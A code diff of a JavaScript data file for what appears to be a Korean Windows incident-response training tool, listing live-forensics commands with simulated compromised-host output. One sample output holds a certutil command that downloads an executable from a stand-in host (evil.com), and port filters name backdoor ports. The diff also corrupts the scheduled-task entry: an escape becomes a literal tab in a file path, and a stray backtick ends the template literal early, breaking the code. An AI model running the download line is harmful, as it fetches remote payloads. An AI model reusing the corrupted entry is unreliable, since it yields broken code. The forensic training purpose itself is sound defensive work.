-        parse_output:"[SRUM 수집 방법 비교]\n\n방법 1: 오프라인 이미지 분석 (권장)\n- 이미지에서 C:\\\\Windows\\\\System32\\\\sru\\\\SRUDB.dat 직접 추출\n- SrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv output\\\n- SOFTWARE 하이브 없으면 앱 이름 GUID로만 표시됨 → 반드시 함께 추출\n\n방법 2: 볼륨 섀도 복사본 (VSS)\n- vssadmin list shadows\n- \\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\sru\\\\SRUDB.dat\n- 라이브 분석 시 VSS에서 복사하여 분석\n\n방법 3: Velociraptor 원격 수집\n- Windows.Forensics.SRUM 아티팩트 — VSS 자동 활용\n\n[시간 제한 확인]\n현재 시간: 2024-10-01\nSRUM 보관: 30일\n→ 2024-09-01 이후 데이터만 존재\n→ 사고 발생 즉시 수집하지 않으면 이벤트 손실!\n\n[타임스탬프 주의]\nSRUM 타임스탬프는 UTC 기준 1시간 단위 버킷 집계\nConnectStartTime만 분·초 단위 정밀도 제공\n분석 시 타임존 변환 반드시 적용",
+        parse_output:`[SRUM 수집 방법 비교]
+
+방법 1: 오프라인 이미지 분석 (권장)
+- 이미지에서 C:\\Windows\\System32\\sru\\SRUDB.dat 직접 추출
+- SrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv output\
+- SOFTWARE 하이브 없으면 앱 이름 GUID로만 표시됨 → 반드시 함께 추출
+
+방법 2: 볼륨 섀도 복사본 (VSS)
+- vssadmin list shadows
+- \\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\sru\\SRUDB.dat
+- 라이브 분석 시 VSS에서 복사하여 분석
+
+방법 3: Velociraptor 원격 수집
+- Windows.Forensics.SRUM 아티팩트 — VSS 자동 활용
+
+[시간 제한 확인]
+현재 시간: 2024-10-01
+SRUM 보관: 30일
+→ 2024-09-01 이후 데이터만 존재
+→ 사고 발생 즉시 수집하지 않으면 이벤트 손실!
+
+[타임스탬프 주의]
+SRUM 타임스탬프는 UTC 기준 1시간 단위 버킷 집계
+ConnectStartTime만 분·초 단위 정밀도 제공
+분석 시 타임존 변환 반드시 적용`,
         interpretation:[
           { field:"운영 중 잠금 (ESE)", meaning:"Windows 운영 중에는 SRUDB.dat이 잠금 상태. 직접 복사 불가. 오프라인 이미지 또는 VSS 활용 필수" },
           { field:"SOFTWARE 하이브 필요", meaning:"SrumECmd에 SOFTWARE 하이브를 함께 제공해야 GUID → 앱 이름 매핑. 없으면 {GUID} 형태로만 표시되어 분석 어려움" },
           { field:"30일 자동 삭제", meaning:"30일 경과 데이터 자동 삭제. 사고 발생 직후 즉시 수집이 핵심. 지연 수집 시 초기 C2 통신 데이터 손실 가능" },
           { field:"1시간 버킷 집계", meaning:"TimeStamp는 1시간 단위. 정확한 시작 시간은 ConnectStartTime 컬럼 확인. 타임라인 분석 시 주의" },
         ],
-        forensic:"30일 제한으로 수집 타이밍이 핵심. VSS가 있다면 더 오래된 SRUM 데이터 복원 가능. SOFTWARE 하이브는 항상 함께 수집.",
-        ioc:"SRUM 첫 레코드가 너무 최근 = 이미 30일치 롤오버로 초기 데이터 손실",
+        forensic:`30일 제한으로 수집 타이밍이 핵심. VSS가 있다면 더 오래된 SRUM 데이터 복원 가능. SOFTWARE 하이브는 항상 함께 수집.`,
+        ioc:`SRUM 첫 레코드가 너무 최근 = 이미 30일치 롤오버로 초기 데이터 손실`,
       },
     ],
     tips:[
@@ -907,32 +1231,52 @@ const LIVE_CATEGORIES = [
       {
         name:"현재 로그온 사용자 확인",
         type:"cmd", threat:true,
-        cmd:"query user\nquser",
-        output:"USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n>attacker_user         rdp-tcp#2           2  Active          .  2024-09-02 02:14  ← 새벽 RDP 세션!\n victim_user           console             1  Active         35  2024-09-02 09:00",
+        cmd:`query user
+quser`,
+        output:`USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>attacker_user         rdp-tcp#2           2  Active          .  2024-09-02 02:14  ← 새벽 RDP 세션!
+ victim_user           console             1  Active         35  2024-09-02 09:00`,
         desc:"현재 활성 세션과 로그온 시간 확인. 새벽 시간대 RDP 세션은 즉시 의심.",
         why:"공격자가 현재도 접속 중일 수 있음. 세션 ID로 프로세스 추적 가능.",
       },
       {
         name:"실행 중인 프로세스 전체 목록",
         type:"cmd", threat:true,
-        cmd:"tasklist /v /fo csv > C:\\\\IR\\\\processes.csv\ntasklist /svc\nGet-Process | Select-Object Name,Id,Path,StartTime | Sort-Object StartTime -Descending | Export-Csv C:\\\\IR\\\\procs.csv",
-        output:"이미지 이름         PID   세션 이름      CPU 시간     메모리 사용   사용자 이름\nsvcupd.exe          4392  Services         0:02:15      12,340 K     SYSTEM         ← 비정상!\ncmd.exe             4512  RDP-Tcp#2        0:00:03       4,120 K     attacker_user\npowershell.exe      4608  RDP-Tcp#2        0:00:45       8,240 K     attacker_user",
+        cmd:`tasklist /v /fo csv > C:\\IR\\processes.csv
+tasklist /svc
+Get-Process | Select-Object Name,Id,Path,StartTime | Sort-Object StartTime -Descending | Export-Csv C:\\IR\\procs.csv`,
+        output:`이미지 이름         PID   세션 이름      CPU 시간     메모리 사용   사용자 이름
+svcupd.exe          4392  Services         0:02:15      12,340 K     SYSTEM         ← 비정상!
+cmd.exe             4512  RDP-Tcp#2        0:00:03       4,120 K     attacker_user
+powershell.exe      4608  RDP-Tcp#2        0:00:45       8,240 K     attacker_user`,
         desc:"비정상 경로 실행 프로세스, 알 수 없는 프로세스명, SYSTEM 권한 비정상 프로세스 탐지.",
         why:"현재 실행 중인 악성 프로세스 즉시 식별. 종료 전 메모리 덤프 수행 가능.",
       },
       {
         name:"네트워크 연결 현황",
         type:"cmd", threat:true,
-        cmd:"netstat -ano\nnetstat -anob\nGet-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Sort-Object RemoteAddress",
-        output:"프로토콜  로컬 주소            외부 주소              상태           PID\nTCP       0.0.0.0:3389         0.0.0.0:0              LISTENING      1088  (RDP 열림)\nTCP       192.168.1.10:49823   45.142.212.99:443      ESTABLISHED    4392  ← C2 연결!\nTCP       192.168.1.10:49901   192.168.10.20:3389     ESTABLISHED    1088  ← 내부 RDP!",
+        cmd:`netstat -ano
+netstat -anob
+Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Sort-Object RemoteAddress`,
+        output:`프로토콜  로컬 주소            외부 주소              상태           PID
+TCP       0.0.0.0:3389         0.0.0.0:0              LISTENING      1088  (RDP 열림)
+TCP       192.168.1.10:49823   45.142.212.99:443      ESTABLISHED    4392  ← C2 연결!
+TCP       192.168.1.10:49901   192.168.10.20:3389     ESTABLISHED    1088  ← 내부 RDP!`,
         desc:"ESTABLISHED 상태 외부 연결 집중 확인. 비정상 포트(4444, 1337 등), 알 수 없는 외부 IP.",
         why:"현재 진행 중인 C2 통신, 측면 이동 연결을 실시간으로 포착.",
       },
       {
         name:"최근 생성 파일 (48시간 이내)",
         type:"powershell", threat:true,
-        cmd:"Get-ChildItem C:\\\\,C:\\\\Windows\\\\Temp,C:\\Users -Recurse -File |\nWhere-Object { $_.CreationTime -gt (Get-Date).AddHours(-48) } |\nSort-Object CreationTime -Descending |\nSelect-Object FullName, CreationTime, Length |\nExport-Csv C:\\\\IR\\recent_files.csv",
-        output:"FullName                                          CreationTime          Length\nC:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe          2024-09-02 09:32:11   251904   ← 악성!\nC:\\\\Windows\\\\Temp\\\\lss.dmp                            2024-09-02 10:44:17   43237376 ← 덤프!\nC:\\\\Staging\\research_archive.7z                     2024-09-10 22:28:30   487221843",
+        cmd:`Get-ChildItem C:\\,C:\\Windows\\Temp,C:\Users -Recurse -File |
+Where-Object { $_.CreationTime -gt (Get-Date).AddHours(-48) } |
+Sort-Object CreationTime -Descending |
+Select-Object FullName, CreationTime, Length |
+Export-Csv C:\\IR\recent_files.csv`,
+        output:`FullName                                          CreationTime          Length
+C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe          2024-09-02 09:32:11   251904   ← 악성!
+C:\\Windows\\Temp\\lss.dmp                            2024-09-02 10:44:17   43237376 ← 덤프!
+C:\\Staging\research_archive.7z                     2024-09-10 22:28:30   487221843`,
         desc:"침해 시간대 전후 생성된 파일 목록. 비정상 경로의 실행파일·덤프·압축파일 우선 확인.",
         why:"악성 파일 드롭 시간과 경로를 실시간으로 파악.",
       },
@@ -945,32 +1289,63 @@ const LIVE_CATEGORIES = [
       {
         name:"로컬 계정 목록 전체",
         type:"cmd", threat:true,
-        cmd:"net user\nGet-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet, Description | Format-Table",
-        output:"사용자 계정\n-------------------------------------------------------------------------------\nAdministrator     admin_bak    Guest    kim_finance    victim_user\n명령을 잘 실행했습니다.\n\nName         Enabled  LastLogon              PasswordLastSet        Description\n----         -------  ---------              ---------------        -----------\nAdministrator True    2024-09-02 10:52:00    2023-01-01 09:00\nadmin_bak    True    2024-09-02 11:20:00    2024-09-02 09:33:00  ← 침해 당일 생성!\nGuest        False   Never",
+        cmd:`net user
+Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet, Description | Format-Table`,
+        output:`사용자 계정
+-------------------------------------------------------------------------------
+Administrator     admin_bak    Guest    kim_finance    victim_user
+명령을 잘 실행했습니다.
+
+Name         Enabled  LastLogon              PasswordLastSet        Description
+----         -------  ---------              ---------------        -----------
+Administrator True    2024-09-02 10:52:00    2023-01-01 09:00
+admin_bak    True    2024-09-02 11:20:00    2024-09-02 09:33:00  ← 침해 당일 생성!
+Guest        False   Never`,
         desc:"PasswordLastSet이 침해 시점과 일치하는 계정 즉시 의심. Description이 비어있는 신규 계정.",
         why:"백도어 계정 여부 신속 파악. 침해 당일 생성된 계정은 공격자 백도어.",
       },
       {
         name:"관리자 그룹 멤버 확인",
         type:"cmd", threat:true,
-        cmd:"net localgroup administrators\nGet-LocalGroupMember -Group Administrators",
-        output:"별칭     administrators\n구성원\n-------------------------------------------------------------------------------\nAdministrator\nWORKSTATION\\\\admin_bak   ← 의심! 정상 멤버가 아님\nDOMAIN\\\\Domain Admins",
+        cmd:`net localgroup administrators
+Get-LocalGroupMember -Group Administrators`,
+        output:`별칭     administrators
+구성원
+-------------------------------------------------------------------------------
+Administrator
+WORKSTATION\\admin_bak   ← 의심! 정상 멤버가 아님
+DOMAIN\\Domain Admins`,
         desc:"Administrators 그룹에 모르는 계정이 있으면 즉시 조사. 도메인 계정이 추가됐으면 측면 이동 의심.",
         why:"공격자가 신규 계정을 만들고 관리자 그룹에 추가하는 패턴 탐지.",
       },
       {
         name:"계정 상세 정보",
         type:"cmd", threat:false,
-        cmd:"net user admin_bak\nnet user Administrator",
-        output:"사용자 이름              admin_bak\n전체 이름\n설명\n사용자 계정 활성         예\n계정 만료              만료 없음\n암호 만료 여부          예\n암호 변경 허용 여부      예\n마지막 설정한 암호       2024-09-02 09:33:00   ← 침해 당일!\n마지막 로그온           2024-09-02 11:20:00\n로그온 횟수            3\n소속 그룹              *Administrators *Users",
+        cmd:`net user admin_bak
+net user Administrator`,
+        output:`사용자 이름              admin_bak
+전체 이름
+설명
+사용자 계정 활성         예
+계정 만료              만료 없음
+암호 만료 여부          예
+암호 변경 허용 여부      예
+마지막 설정한 암호       2024-09-02 09:33:00   ← 침해 당일!
+마지막 로그온           2024-09-02 11:20:00
+로그온 횟수            3
+소속 그룹              *Administrators *Users`,
         desc:"마지막 암호 설정 시간 = 계정 생성 시간. 침해 시간과 일치 확인.",
         why:"계정 생성 시간, 로그온 횟수, 그룹 멤버십을 한 번에 확인.",
       },
       {
         name:"도메인 환경 — 도메인 관리자 확인",
         type:"cmd", threat:true,
-        cmd:"net group \"Domain Admins\" /domain\nnet group \"Enterprise Admins\" /domain",
-        output:"그룹 이름    Domain Admins\n구성원\n-------------------------------------------------------------------------------\nAdministrator    backup_admin    ← 의심! 정상 DA가 아님",
+        cmd:`net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain`,
+        output:`그룹 이름    Domain Admins
+구성원
+-------------------------------------------------------------------------------
+Administrator    backup_admin    ← 의심! 정상 DA가 아님`,
         desc:"도메인 환경에서 Domain Admins에 비정상 계정 추가 여부 확인. Enterprise Admins도 반드시 확인.",
         why:"도메인 전체 장악 여부 판단. Domain Admins 추가 = 전체 도메인 침해.",
       },
@@ -983,32 +1358,64 @@ const LIVE_CATEGORIES = [
       {
         name:"비정상 경로 프로세스 탐지",
         type:"powershell", threat:true,
-        cmd:"Get-WmiObject Win32_Process | Select-Object Name,ProcessId,ExecutablePath,CommandLine |\nWhere-Object { $_.ExecutablePath -match \"Temp|AppData|ProgramData|Users\\\\Public\" } |\nFormat-List",
-        output:"Name          : svcupd.exe\nProcessId     : 4392\nExecutablePath: C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe  ← ProgramData!\nCommandLine   : \"C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe\" /silent\n\nName          : cmd.exe\nProcessId     : 4512\nExecutablePath: C:\\Windows\\System32\\cmd.exe\nCommandLine   : cmd.exe /c whoami && ipconfig /all  ← 정찰 명령!",
+        cmd:`Get-WmiObject Win32_Process | Select-Object Name,ProcessId,ExecutablePath,CommandLine |
+Where-Object { $_.ExecutablePath -match "Temp|AppData|ProgramData|Users\\Public" } |
+Format-List`,
+        output:`Name          : svcupd.exe
+ProcessId     : 4392
+ExecutablePath: C:\ProgramData\MicrosoftUpdate\svcupd.exe  ← ProgramData!
+CommandLine   : "C:\ProgramData\MicrosoftUpdate\svcupd.exe" /silent
+
+Name          : cmd.exe
+ProcessId     : 4512
+ExecutablePath: C:\Windows\System32\cmd.exe
+CommandLine   : cmd.exe /c whoami && ipconfig /all  ← 정찰 명령!`,
         desc:"Temp·AppData·ProgramData·Users\\\\Public 경로의 프로세스는 즉시 의심.",
         why:"정상 Windows 프로세스는 System32·Program Files에서 실행됨. 비정상 경로 = 악성 가능성 매우 높음.",
       },
       {
         name:"서비스 목록 — 비정상 탐지",
         type:"cmd", threat:true,
-        cmd:"sc query type= all state= all\nGet-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName\nGet-WmiObject Win32_Service | Select-Object Name,State,PathName | Where-Object {$_.PathName -match 'Temp|AppData|ProgramData'}",
-        output:"Name         State    PathName\n----         -----    --------\nmalware_svc  Running  C:\\Windows\\Temp\\malware_svc.exe  ← Temp 경로!\nPSEXESVC     Stopped  C:\\Windows\\PSEXESVC.exe          ← PsExec 흔적!\nwuauserv2    Running  C:\\ProgramData\\win_update.exe    ← 위장 서비스!",
+        cmd:`sc query type= all state= all
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName
+Get-WmiObject Win32_Service | Select-Object Name,State,PathName | Where-Object {$_.PathName -match 'Temp|AppData|ProgramData'}`,
+        output:`Name         State    PathName
+----         -----    --------
+malware_svc  Running  C:\Windows\Temp\malware_svc.exe  ← Temp 경로!
+PSEXESVC     Stopped  C:\Windows\PSEXESVC.exe          ← PsExec 흔적!
+wuauserv2    Running  C:\ProgramData\win_update.exe    ← 위장 서비스!`,
         desc:"PathName이 Temp·AppData·ProgramData인 서비스, PSEXESVC 존재, Windows 서비스명 위장(wuauserv2 등).",
         why:"악성 서비스는 재부팅 후에도 지속. PSEXESVC는 PsExec 원격 실행 흔적.",
       },
       {
         name:"자동 시작 항목 전체 (Autoruns 대체)",
         type:"cmd", threat:true,
-        cmd:"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nschtasks /query /fo LIST /v | findstr \"작업 이름\\|실행\\|상태\"",
-        output:"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth    REG_SZ    C:\\Windows\\System32\\SecurityHealthSystray.exe\n    WindowsUpdate     REG_SZ    C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe /silent  ← 의심!\n    OneDrive          REG_SZ    C:\\Program Files\\OneDrive\\OneDrive.exe",
+        cmd:`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+schtasks /query /fo LIST /v | findstr "작업 이름\|실행\|상태"`,
+        output:`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    SecurityHealth    REG_SZ    C:\Windows\System32\SecurityHealthSystray.exe
+    WindowsUpdate     REG_SZ    C:\ProgramData\MicrosoftUpdate\svcupd.exe /silent  ← 의심!
+    OneDrive          REG_SZ    C:\Program Files\OneDrive\OneDrive.exe`,
         desc:"Run 키에 System32·Program Files 외 경로 = 의심. RunOnce는 1회 실행 드롭퍼에서 사용.",
         why:"악성코드 지속성 메커니즘 즉시 파악. 정상 항목과 다른 것이 있으면 해당 파일 즉시 분석.",
       },
       {
         name:"부모-자식 프로세스 트리",
         type:"powershell", threat:true,
-        cmd:"Get-WmiObject Win32_Process | Select-Object ProcessId,ParentProcessId,Name,CommandLine |\nForEach-Object {\n  $parent = Get-WmiObject Win32_Process -Filter \"ProcessId=\\$(\\$_.ParentProcessId)\"\n  [PSCustomObject]@{\n    PID=$_.ProcessId; Name=$_.Name;\n    ParentName=$parent.Name; ParentPID=$_.ParentProcessId;\n    CMD=$_.CommandLine\n  }\n} | Where-Object {$_.ParentName -eq \"WINWORD.EXE\" -or $_.ParentName -eq \"OUTLOOK.EXE\"}",
-        output:"PID   Name           ParentName    ParentPID  CMD\n4608  powershell.exe WINWORD.EXE   3824       powershell -enc JABzAHYA...  ← 매크로 실행!\n4392  cmd.exe        WINWORD.EXE   3824       cmd /c certutil -urlcache -f http://evil.com/a.exe",
+        cmd:`Get-WmiObject Win32_Process | Select-Object ProcessId,ParentProcessId,Name,CommandLine |
+ForEach-Object {
+  $parent = Get-WmiObject Win32_Process -Filter "ProcessId=\\$(\$_.ParentProcessId)"
+  [PSCustomObject]@{
+    PID=$_.ProcessId; Name=$_.Name;
+    ParentName=$parent.Name; ParentPID=$_.ParentProcessId;
+    CMD=$_.CommandLine
+  }
+} | Where-Object {$_.ParentName -eq "WINWORD.EXE" -or $_.ParentName -eq "OUTLOOK.EXE"}`,
+        output:`PID   Name           ParentName    ParentPID  CMD
+4608  powershell.exe WINWORD.EXE   3824       powershell -enc JABzAHYA...  ← 매크로 실행!
+4392  cmd.exe        WINWORD.EXE   3824       cmd /c certutil -urlcache -f http://evil.com/a.exe`,
         desc:"Office 앱이 부모 프로세스인 cmd·powershell 탐지 = 악성 매크로 실행 증거.",
         why:"피싱 매크로·취약점 익스플로잇의 전형적인 프로세스 체인 즉시 파악.",
       },
@@ -1021,32 +1428,70 @@ const LIVE_CATEGORIES = [
       {
         name:"DNS 캐시 확인 — C2 도메인 탐지",
         type:"cmd", threat:true,
-        cmd:"ipconfig /displaydns\nGet-DnsClientCache | Sort-Object TimeToLive | Format-Table -AutoSize",
-        output:"레코드 이름 . . . . : update-ms-cdn.com      ← C2 도메인!\n레코드 유형 . . . . : 1  (A 레코드)\nTTL(초) . . . . . . : 42\n데이터 길이 . . . . : 4\n섹션 . . . . . . . : 응답\nA(호스트) 레코드 . : 45.142.212.99\n\n레코드 이름 . . . . : attacker-cdn.com\nA(호스트) 레코드 . : 185.220.101.45",
+        cmd:`ipconfig /displaydns
+Get-DnsClientCache | Sort-Object TimeToLive | Format-Table -AutoSize`,
+        output:`레코드 이름 . . . . : update-ms-cdn.com      ← C2 도메인!
+레코드 유형 . . . . : 1  (A 레코드)
+TTL(초) . . . . . . : 42
+데이터 길이 . . . . : 4
+섹션 . . . . . . . : 응답
+A(호스트) 레코드 . : 45.142.212.99
+
+레코드 이름 . . . . : attacker-cdn.com
+A(호스트) 레코드 . : 185.220.101.45`,
         desc:"DNS 캐시에 C2 도메인, 피싱 사이트, 공격자 인프라 도메인이 있으면 즉시 포착. 재부팅 전까지만 유효.",
         why:"C2 도메인이 브라우저 히스토리에서 삭제됐어도 DNS 캐시에 남아있을 수 있음.",
       },
       {
         name:"공유 자원 & 연결된 드라이브",
         type:"cmd", threat:true,
-        cmd:"net share\nnet use\nGet-SmbShare\nGet-SmbConnection",
-        output:"공유 이름   리소스                   설명\n---------   ---------                   ----\nC$          C:\\                         기본 공유\nIPC$        원격 IPC\nADMIN$      C:\\Windows                  원격 관리\nStaging     C:\\Staging                  ← 비정상 공유! 공격자가 만든 것\n\n현재 연결:\n상태     로컬  원격                     네트워크\nOK            \\192.168.10.20\\C$       Microsoft Windows Network  ← 내부 서버 접속!",
+        cmd:`net share
+net use
+Get-SmbShare
+Get-SmbConnection`,
+        output:`공유 이름   리소스                   설명
+---------   ---------                   ----
+C$          C:\                         기본 공유
+IPC$        원격 IPC
+ADMIN$      C:\Windows                  원격 관리
+Staging     C:\Staging                  ← 비정상 공유! 공격자가 만든 것
+
+현재 연결:
+상태     로컬  원격                     네트워크
+OK            \192.168.10.20\C$       Microsoft Windows Network  ← 내부 서버 접속!`,
         desc:"C$·ADMIN$·IPC$ 외 알 수 없는 공유 폴더, 내부 서버로의 net use 연결 탐지.",
         why:"공격자가 만든 비정상 공유 폴더, 측면 이동을 위한 내부 서버 연결 즉시 파악.",
       },
       {
         name:"방화벽 규칙 — 비정상 허용 규칙",
         type:"powershell", threat:true,
-        cmd:"Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True' -and $_.Action -eq 'Allow'} |\nGet-NetFirewallPortFilter |\nWhere-Object {$_.LocalPort -in @('4444','1337','8080','8443','9090')}\n\nnetsh advfirewall firewall show rule name=all | findstr \"규칙 이름\\|사용\\|동작\\|로컬 포트\"",
-        output:"DisplayName       : Allow_backdoor_4444\nEnabled           : True\nDirection         : Inbound\nAction            : Allow\nLocalPort         : 4444           ← 백도어 포트!\n\nDisplayName       : Allow_C2\nLocalPort         : 8443\nRemoteAddress     : 45.142.212.99  ← 특정 IP 허용!",
+        cmd:`Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True' -and $_.Action -eq 'Allow'} |
+Get-NetFirewallPortFilter |
+Where-Object {$_.LocalPort -in @('4444','1337','8080','8443','9090')}
+
+netsh advfirewall firewall show rule name=all | findstr "규칙 이름\|사용\|동작\|로컬 포트"`,
+        output:`DisplayName       : Allow_backdoor_4444
+Enabled           : True
+Direction         : Inbound
+Action            : Allow
+LocalPort         : 4444           ← 백도어 포트!
+
+DisplayName       : Allow_C2
+LocalPort         : 8443
+RemoteAddress     : 45.142.212.99  ← 특정 IP 허용!`,
         desc:"비정상 포트(4444, 1337, 8080 등) 허용 규칙, 특정 외부 IP 허용 규칙 탐지.",
         why:"공격자가 백도어 통신을 위해 방화벽 규칙을 추가하는 패턴.",
       },
       {
         name:"ARP 테이블 — 내부 접속 흔적",
         type:"cmd", threat:false,
-        cmd:"arp -a\nGet-NetNeighbor | Where-Object {$_.State -eq 'Reachable'}",
-        output:"인터페이스: 192.168.1.10 --- 0x4\n  인터넷 주소          물리적 주소           형식\n  192.168.1.1          00-11-22-33-44-55     동적\n  192.168.10.20        aa-bb-cc-dd-ee-ff     동적    ← 내부 서버 (측면이동 대상)\n  192.168.10.50        11-22-33-44-55-66     동적    ← 추가 내부 접속!",
+        cmd:`arp -a
+Get-NetNeighbor | Where-Object {$_.State -eq 'Reachable'}`,
+        output:`인터페이스: 192.168.1.10 --- 0x4
+  인터넷 주소          물리적 주소           형식
+  192.168.1.1          00-11-22-33-44-55     동적
+  192.168.10.20        aa-bb-cc-dd-ee-ff     동적    ← 내부 서버 (측면이동 대상)
+  192.168.10.50        11-22-33-44-55-66     동적    ← 추가 내부 접속!`,
         desc:"ARP 테이블에 있는 IP = 최근 통신한 내부 호스트. 측면 이동 대상 서버 파악.",
         why:"공격자가 접근한 내부 시스템 목록 파악. IP → 자산 목록 대조로 영향 범위 신속 파악.",
       },
@@ -1059,32 +1504,75 @@ const LIVE_CATEGORIES = [
       {
         name:"예약 작업 — 비정상 탐지",
         type:"cmd", threat:true,
-        cmd:"schtasks /query /fo CSV /v > C:\\IR\tasks.csv\nGet-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} |\nSelect-Object TaskName, TaskPath, State |\nWhere-Object {$_.TaskPath -notmatch \"\\\\Microsoft\\\\"}",
-        output:"TaskName               TaskPath         State\n--------               --------         -----\nMicrosoftEdgeUpdateCore  \\             Ready   ← 루트 경로 + Microsoft 위장!\n악성작업_임시            \\             Running ← 루트 경로 비정상!\nWindowsDefenderUpdate    \\             Ready   ← Defender 위장!",
+        cmd:`schtasks /query /fo CSV /v > C:\IR	asks.csv
+Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} |
+Select-Object TaskName, TaskPath, State |
+Where-Object {$_.TaskPath -notmatch "\\Microsoft\\`}",
+        output:`TaskName               TaskPath         State
+--------               --------         -----
+MicrosoftEdgeUpdateCore  \             Ready   ← 루트 경로 + Microsoft 위장!
+악성작업_임시            \             Running ← 루트 경로 비정상!
+WindowsDefenderUpdate    \             Ready   ← Defender 위장!`,
         desc:"TaskPath가 루트(\\\)인 작업은 의심. Microsoft 정상 작업은 \\\Microsoft\\\ 하위에 위치.",
         why:"공격자가 지속성을 위해 예약 작업 루트에 등록. Microsoft 이름 위장 패턴 탐지.",
       },
       {
         name:"Windows Defender 상태 확인",
         type:"powershell", threat:true,
-        cmd:"Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled,\n  RealTimeProtectionEnabled, OnAccessProtectionEnabled, IsTamperProtected\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" 2>$null",
-        output:"AMServiceEnabled          : False   ← 비활성화!\nAntispywareEnabled        : False\nRealTimeProtectionEnabled : False   ← 실시간 보호 OFF!\nOnAccessProtectionEnabled : False\nIsTamperProtected         : False   ← 변조 방지 OFF!\n\n레지스트리 값:\nDisableAntiSpyware      : 1\nDisableRealtimeMonitoring: 1",
+        cmd:`Get-MpComputerStatus | Select-Object AMServiceEnabled, AntispywareEnabled,
+  RealTimeProtectionEnabled, OnAccessProtectionEnabled, IsTamperProtected
+Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" 2>$null`,
+        output:`AMServiceEnabled          : False   ← 비활성화!
+AntispywareEnabled        : False
+RealTimeProtectionEnabled : False   ← 실시간 보호 OFF!
+OnAccessProtectionEnabled : False
+IsTamperProtected         : False   ← 변조 방지 OFF!
+
+레지스트리 값:
+DisableAntiSpyware      : 1
+DisableRealtimeMonitoring: 1`,
         desc:"모든 항목이 False = 완전 비활성화. 공격자가 보안 소프트웨어를 비활성화한 증거.",
         why:"공격자가 악성코드 실행 전 Defender를 비활성화하는 패턴. 즉시 재활성화 전 증거 수집.",
       },
       {
         name:"gpedit.msc — 그룹 정책 확인",
         type:"gui", threat:true,
-        cmd:"# GUI 방법\ngpedit.msc 실행 →\n  [컴퓨터 구성] → [Windows 설정] → [보안 설정] → [로컬 정책] → [감사 정책]\n  : 로그온 이벤트 감사, 개체 엑세스 감사 활성화 여부 확인\n\n  [컴퓨터 구성] → [관리 템플릿] → [Windows 구성 요소] → [Windows Defender 바이러스 백신]\n  : 바이러스 백신 비활성화 여부 확인\n\n# PowerShell 대체 (빠른 확인)\nauditpol /get /category:*\nsecedit /export /cfg C:\\IR\\security_policy.cfg /areas SECURITYPOLICY",
-        output:"카테고리/하위 카테고리          설정\n-----------------------------------------\n시스템                          성공 및 실패\n로그온/로그오프\n  로그온                        성공 및 실패  ← OK\n  로그오프                      성공          ← OK\n개체 엑세스\n  파일 시스템                   감사 안 함    ← 비활성화! 파일 접근 로그 없음\n프로세스 추적\n  프로세스 생성                 감사 안 함    ← 비활성화! 4688 이벤트 없음",
+        cmd:`# GUI 방법
+gpedit.msc 실행 →
+  [컴퓨터 구성] → [Windows 설정] → [보안 설정] → [로컬 정책] → [감사 정책]
+  : 로그온 이벤트 감사, 개체 엑세스 감사 활성화 여부 확인
+
+  [컴퓨터 구성] → [관리 템플릿] → [Windows 구성 요소] → [Windows Defender 바이러스 백신]
+  : 바이러스 백신 비활성화 여부 확인
+
+# PowerShell 대체 (빠른 확인)
+auditpol /get /category:*
+secedit /export /cfg C:\IR\security_policy.cfg /areas SECURITYPOLICY`,
+        output:`카테고리/하위 카테고리          설정
+-----------------------------------------
+시스템                          성공 및 실패
+로그온/로그오프
+  로그온                        성공 및 실패  ← OK
+  로그오프                      성공          ← OK
+개체 엑세스
+  파일 시스템                   감사 안 함    ← 비활성화! 파일 접근 로그 없음
+프로세스 추적
+  프로세스 생성                 감사 안 함    ← 비활성화! 4688 이벤트 없음`,
         desc:"프로세스 생성 감사 비활성화 시 4688 이벤트 없음. 파일 시스템 감사 비활성화 시 파일 접근 로그 없음.",
         why:"공격자가 자신의 행위 로깅을 막기 위해 감사 정책을 비활성화하는 패턴 탐지.",
       },
       {
         name:"Winlogon & LSA 설정 변조 확인",
         type:"cmd", threat:true,
-        cmd:"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL",
